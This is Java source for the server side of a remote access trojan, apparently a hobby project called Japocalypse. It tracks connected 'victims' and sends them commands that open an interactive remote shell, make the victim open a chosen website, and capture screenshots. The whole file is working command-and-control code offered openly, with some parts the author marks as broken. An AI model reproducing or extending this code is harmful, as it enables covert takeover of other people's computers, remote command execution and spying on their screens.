package Server;

import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.*;
import java.net.Socket;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Scanner;

/**
 * Created by mpampis on 10/14/2017.
 */
public class Utilities {

    private static byte[] end = {-1, -1, -1, '!'};
    private Utilities() {

    }

    /**
     * Takes a list and an object and returns the index of the object inside the list.
     * @param list the list
     * @param object the object
     * @return the index of the object inside the list
     */
    public static int indexOf(List<?> list, Object object) {
        for(int i = 0; i < list.size();i++) {
            if(list.get(i).equals(object)) {
                return i;
            }
        }

        return -1;
    }

    /**
     * Prints a list with each element in a new line
     * @param list the list to be printed
     * @param <T> the type of the elements to be printed
     */
    public static <T> void printList(List<T> list) {
        for(T item : list) {
            System.out.println(item);
        }
    }

    /**
     * Takes an printWriter(outputStream), write on it and then flush it.
     * @param out the printWriter
     * @param str the string to be written in the stream
     */
    public static void print(PrintWriter out, String str) {
        out.print(str);
        out.flush();
    }


    public static void println(PrintWriter out, String str) {
         print(out, str + "\n");
    }


    /**
     * Loads server commands
     * @param server an instance to the server, we need this to use some of the methods of the server
     * @return an ArrayList for all the server commands.
     */
    public static ArrayList<Command> loadServerCommands(Japocalypse server) {
        ArrayList<Command> list = new ArrayList<>();

        Command c = new Command("sessions"); // creating a command

        // adding logic to the command
        c.addLogic(args -> {
            if(args.length == 0) {
                server.printConnectedMachines(); // if its just sessions without arguments then just print the connected machines.
            }
            else {
                if(args[0].equals("-i")) { // if the first argument is i
                    try {
                        int id = Integer.parseInt(args[1]); // try to convert the next argument to int, it will throw an exception if its not integer
                        int index = Utilities.indexOf(server.getVictimList(), id); // find the index of the victim with the specified id inside the victimList

                        if(index < 0) { // if index is negative then we couldn't found the specified victim
                            System.out.println("Could not find this session's id"); // printError
                            return false; // return false to indicate that something went wrong with the execution of this command
                        }

                        /**
                         * if we are here thats mean that everything went smoothly and the victim we are looking for is at
                         * index possition inside the victimList.
                         */
                         server.handleVictim(server.getVictimList().get(index));

                    }
                    catch(NumberFormatException e) { // if it wasn't number the ID
                        System.out.println("Invalid argument: "+args[1]);
                    }
                    catch(IndexOutOfBoundsException e) { // if the ID is missing.
                        System.out.println("Missing argument");
                    }
                }
                else {
                    System.out.println("Cannot find command"); // if the argument is different than i then we don't know what to do
                    return false;
                }
            }
            return true; // if we are here we managed to handle the victim and now we return true
        });

        // adding command to the list
        list.add(c);

        return list;
    }

     public synchronized static void removeDeadConnections(List<Victim> victimList) {
        for(Victim v : victimList) {
            if(!v.isAlive()) {
                System.out.println("Connection refused: "+ v.getIP());
                victimList.remove(v);
            }
        }
    }

    /**
     * This method load all the victim commands
     * @return the list of all the victim commands
     */
    public static ArrayList<VictimCommand> loadVictimCommands() {
        ArrayList<VictimCommand> list = new ArrayList<>();

        VictimCommand c = new VictimCommand("shell");

        c.addLogic((victim, args) -> {
            if(args.length != 0) {
                return true; // if it had arguments we don't know what to do, return true to indicate to not kill the victim
            }

            println(victim.out, "shell"); // send via socket to the client to open a shell
            try {
                Thread.sleep(150); // wait a bit :P
            }
            catch(InterruptedException e) {

            }
            boolean flag = false; // init a flag, I will explain later
            while(victim.isAlive()) { // if the victimIsAlive
                /**
                 * Okay if the flag is set to true then it means that we don't wait a response from the client
                 * actually is the otherway around. The client waits a command from the server.
                 * This scenario can occurs if the server use the !update command or smth else that it's possible to be added later on.
                 */
                if(!flag) {
                    String response = victim.waitForAndRead(5000); // wait 5 seconds

                    if(response.trim().equals("WAITING STATE")) {  // the client returns WAITING STATE only when you asked him to close the shell and now waits for new commands.
                        return true; // return true, because we did what we wanted to do and we said in the victim just to close the shell and it was sucessfull.
                    }

                    System.out.print(response); // if it is the output from the shell, then just print it to server screen.
                }

                if (victim.timedout()) { // but if the client timedout, return false to indicate that something went wrong.
                    return false;
                } else {
                    flag = false; // reset the flag
                    String shellCommand = read(); // we reading the sellComand from the server which later we will send to the client via socket.
                    if (shellCommand.equals("back")) { // if it's back
                        println(victim.out, "back"); // tell to client to close the shell. The client should response with "WAITING STATE".
                    }
                    else if(shellCommand.equals("!update")) { // if the command is update then it's mean that something went wrong with the output from the shell.. try to read everything from the buffer and print it
                        System.out.println(victim.readRemainingData());
                        flag = true; // indicate that in the next loop to not wait for a response from the client, because the server must give the shell command
                    }
                    else {
                        println(victim.out, shellCommand); // else if it's not from the commands above, send the shellCommand to the client.
                    }
                }
            }

            return true; // return true.. not sure maybe this should be false because the only valid way to exit the while loop is using the back command.
        });

        VictimCommand c1 = new VictimCommand("open");
        c1.addLogic((victim, args) -> {
            String url = "";
            try {
                url = args[0];
            }
            catch(IndexOutOfBoundsException e) {
                System.out.println("you have to specify what website the client should open");
                return true;
            }

            // do a check to see if it's a valid url address
            if(!(url.startsWith("https://www.") || url.startsWith("http://www.") || url.startsWith("www."))) {
                url = "http://www.";
            }

            println(victim.out, c1.toString() +" "+url); // this is saying to the client to open the website
            return true;
        });

        VictimCommand c2 = new VictimCommand("screenshot");

        /**
         * this is broken and must be fixed..
         */

        c2.addLogic((victim, args) -> {
            if(args.length != 0) {
                return true;
            }

            println(victim.out, "screenshot");
            String response = victim.waitForAndRead(5000); // wait 5 seconds
            if(!response.trim().equals("imageStarting")) {
                return false;
            }

            return readPhoto(victim);
        });

        // add all victimCommands to the list
        list.add(c);
        list.add(c1);
        list.add(c2);
        return list;
    }

    /**
     * BROKEEEEEEN
     * @param victim
     * @return
     */
    public static boolean readPhoto(Victim victim) {
        Socket socket = victim.getSocket();
        SimpleDateFormat simpleDateFormat = new SimpleDateFormat("ddMMyy-hhmmss.SSS");
        File file = new File(simpleDateFormat.format(new Date()) +".png");
        byte[] buffer = new byte[4];
        try ( FileOutputStream fos = new FileOutputStream(file);
              BufferedOutputStream bos = new BufferedOutputStream(fos)){

            InputStream socketStream = socket.getInputStream();
            while(socketStream.available() > 0 && !matches(end, buffer)) {
                socketStream.read(buffer);
                bos.write(buffer);
            }


            victim.readRemainingData();

            System.out.println("Screenshot saved: "+file.toString());

            String response = victim.waitForAndRead(5000); // 5 seconds

            if(response.trim().equals("WAITING STATE")) {
                return true;
            }

        }
        catch(Exception e) {

        }

        return false;


    }

    /**
     * Reads a String from standarInput using a prompt
     * @param str the prompt message
     * @return the String that user typed
     */
    public static String read(String str) {
        System.out.print(str);
        return new Scanner(System.in).nextLine();
    }

    /**
     * Reads a String from standarInput
     * @return the String which the user typed
     */
    public static String read() {
        return new Scanner(System.in).nextLine();
    }

    /**
     * USELSES
     * @param mask
     * @param data
     * @return
     */
    public static boolean matches(byte[] mask, byte[] data) {
        if(mask.length != data.length) {
            return false;
        }

        for(int i = 0; i < mask.length; i++) {
            if(mask[i] != data[i]) {
                return false;
            }
        }

        return true;
    }

    public static String[] extractArguments(String command) {
        ArrayList<String> args = new ArrayList<>();

        String[] splitedCommand = command.split(" ");
        for(int i = 1; i < splitedCommand.length; i++) {
            if(!splitedCommand[i].isEmpty()) {
                args.add(splitedCommand[i]);
            }
        }

        return args.toArray(new String[args.size()]);
    }
}
